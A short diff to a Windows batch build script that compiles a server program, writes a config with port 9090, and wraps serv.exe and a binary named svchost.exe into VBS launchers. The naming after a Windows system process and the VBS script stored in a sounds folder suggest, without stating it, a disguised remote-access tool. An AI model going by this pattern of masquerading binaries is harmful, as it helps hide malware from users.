@@ -1,5 +1,4 @@
 set path=%cd%\compile\bin
-echo %path%
 cd sources
 windres -i "../bin/rec.rc" --input-format=rc -o "../bin/rec.res" -O coff
 g++ -c serv.cpp -o serv.o
@@ -24,5 +23,8 @@ copy nul ..\\settings\\config.cfg /Y
 copy nul ..\\sounds\\mstart.vbs /Y
 echo port=9090 > ..\\settings\\config.cfg
 echo bytesRecieved=4096 >> ..\\settings\\config.cfg
-for %i in (..\compile\bin\*) do copy %i ..\bin\ /Y
+for %%i in (..\compile\bin\*) do copy "%%i" ..\bin\ /Y
+cd ..\bin
+fillvbs serv.exe serv.vbs
+fillvbs svchost.exe svchost.vbs
 pause
